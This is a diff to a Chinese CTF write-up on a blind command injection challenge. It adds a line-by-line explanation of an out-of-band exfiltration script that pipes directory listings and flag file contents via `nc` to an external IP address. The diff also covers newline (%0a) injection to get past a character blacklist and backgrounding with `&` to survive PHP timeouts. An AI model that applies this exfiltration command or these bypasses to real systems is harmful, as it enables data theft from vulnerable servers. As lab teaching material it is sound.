@@ -1,9 +1,11 @@
 ---
-title: "[N1BOOK] 死亡ping命"
+title: "[N1BOOK] 死亡ping命令"
 date: 2026-07-14
 categories:
   - CTF
   - WEB
+tags:
+  - OOB数据外带
 ---
 
 # 1. 题目分析
@@ -279,6 +281,89 @@ ssh aliyun-root "systemctl start httpd"   # 恢复 Apache
 
 这是从 `ls /` 输出中发现的。容器根目录下同时有 `FLAG` 和 `flag` 吗？实际上 `ls /` 输出中有 `FLAG`，`cat /FLAG` 返回了 flag 内容。`cat /flag`（小写）在容器中不存在（文件系统区分大小写）。
 
+## 4.6 外带脚本逐行详解
+
+```bash
+cat > /root/s.sh << 'EOF'
+{ ls /; echo ===; cat /flag 2>/dev/null; cat /FLAG 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null; } | nc 101.132.149.233 1111 &
+EOF
+```
+
+### 第一层：heredoc 写入文件
+
+```bash
+cat > /root/s.sh << 'EOF'
+...内容...
+EOF
+```
+
+把两行 `EOF` 之间的内容写入 `/root/s.sh`。`'EOF'` 加了单引号（heredoc 的界定符被引号包裹），意味着**不解析变量**——内容中的 `$`、`\` 等特殊字符全部原样写入，不会被子 shell 展开。
+
+### 第二层：命令组 + 管道 + 后台
+
+```bash
+{ ls /; echo ===; cat /flag 2>/dev/null; cat /FLAG 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null; } | nc 101.132.149.233 1111 &
+```
+
+| 语法元素          | 说明                                            |
+| ------------- | --------------------------------------------- |
+| `{ ... }`     | 命令组，把里面所有命令的 **stdout 合并成一股流**                |
+| \|            | 管道，把命令组的 stdout 送给 `nc` 的 stdin               |
+| `&`           | 末尾 `&`：整个管道在后台运行，shell **fork 后立即返回**，PHP 不阻塞 |
+| `2>/dev/null` | stderr 重定向到 `/dev/null`，错误不混入管道               |
+
+### 命令组内部逐个拆解
+
+| 命令 | 作用 | 为什么这么写 |
+|------|------|-------------|
+| `ls /` | 列出根目录 | **侦察**：看清靶机文件结构，确认 flag 文件名和路径 |
+| `echo ===` | 输出分隔符 | 把 `ls /` 的输出和后续 flag 内容分隔，方便阅读 |
+| `cat /flag 2>/dev/null` | 读 `/flag`（小写） | 尝试读 flag，失败静默（不输出错误到管道） |
+| `cat /FLAG 2>/dev/null` | 读 `/FLAG`（大写） | 同上，**这一行命中了** |
+| `find / -maxdepth 3 -name 'flag*' 2>/dev/null` | 全盘搜索 flag 文件 | 兜底搜索，万一 flag 不在标准路径也能找到 |
+
+### 数据流向图
+
+```
+ls / ─────────┐
+echo === ─────┤
+cat /flag ────┼──> stdout ──> | nc 101.132.149.233 1111 ──> 阿里云 nc 接收
+cat /FLAG ────┤                                              (保存到 flag_out.txt)
+find / ... ───┘
+              └── 2>/dev/null: stderr 丢弃，不混入管道
+```
+
+### `&` 为什么比 `nohup` 更关键
+
+```
+没有 &:
+  PHP system("sh /tmp/s.sh")
+    └─ sh 执行脚本，等待内部命令结束
+         └─ { ... } | nc ...  阻塞等待 nc 关闭连接
+              └─ PHP 60s 后超时 → Nginx 504 → kill 进程树 → 数据丢失
+
+有 &:
+  PHP system("sh /tmp/s.sh")
+    └─ sh 执行脚本，遇到 & → fork 后台进程
+         ├─ 父进程：立即退出（PHP 收到返回 → HTTP 200）
+         └─ 子进程：{ ... } | nc ... 独立运行
+              └─ 不受 PHP 超时影响 → 完整发送 flag ✅
+```
+
+### 实际收到的输出
+
+```
+Listening on 0.0.0.0 1111
+Connection received on 117.21.200.176 59194
+FLAG          ← ls / 输出中的一项
+bin
+dev
+etc
+...
+===
+n1book{6fa82809179d7f19c67259aa285a7729}   ← cat /FLAG 的输出
+```
+
 # 5. Flag
 
 ```
@@ -292,11 +377,12 @@ n1book{6fa82809179d7f19c67259aa285a7729}
 | **命令注入（Command Injection）** | 用户输入被拼接到 `system()`/`exec()` 中执行 |
 | **黑名单绕过** | 利用不在黑名单中的字符构造 Payload |
 | **%0a 换行符注入** | URL 编码的 `\n` 在 Shell 中作为命令分隔符 |
-| **--data-raw vs --data-urlencode** | 前者发送原始数据，后者会 URL 编码 → 可能导致双重编码被过滤 |
-| **Blind Command Injection** | 命令执行成功但无回显，需要 OOB 或时间盲注 |
-| **OOB（Out-of-Band）数据外带** | 通过 nc/curl 将数据发送到外部可控服务器 |
-| **nohup 后台执行** | 避免长时间运行的命令被 PHP 超时机制 kill |
-| **Nginx 反向代理超时** | `proxy_read_timeout` 默认 60s，子进程阻塞会触发 504 |
+| **`--data-raw` vs `--data-urlencode`** | 前者发送原始数据，后者会 URL 编码 → 可能导致双重编码被过滤 |
+| **Blind Command Injection** | 命令执行成功但无回显 |
+| **时间盲注（诊断用）** | 用 `sleep` 验证注入是否生效，不是主要攻击手段 |
+| **OOB（Out-of-Band）数据外带** | **本题核心**：通过 nc/curl 将数据发送到外部可控服务器 |
+| **`&` 后台化（脚本内）** | `nohup` 不能解决 `system()` 阻塞，脚本内 `&` 才能让 shell 立即返回 |
+| **Nginx 504 超时** | 不等于攻击失败，数据可能在超时前已发出 |
 
 ## 6.1 防御建议
 
@@ -321,13 +407,14 @@ n1book{6fa82809179d7f19c67259aa285a7729}
 确认存在过滤机制
     ↓
 黑名单字符模糊测试（逐字符探测）
-    ↓ 发现空格 <.> </.> / 不被过滤
+    ↓ 发现空格 . / 不被过滤
 关键绕过发现：
     ↓ --data-raw 发送 %0a（PHP 解码为 \n）
     ↓ \n 不在黑名单 → Shell 中 \n 作为命令分隔符 ✅
-时间盲注验证：sleep 3 → 响应延迟 3s ✅
     ↓
-确认 Blind Command Injection（无回显）
+推断：无回显 → 只能走 Blind 路线
+    ├── 路径 A：时间盲注逐字符猜解（太慢，不采用）
+    └── 路径 B：OOB 带外数据外传 ✅（走这条）
     ↓
 搭建 OOB 数据外带
     ├─ 阿里云: systemctl stop httpd（释放 80）
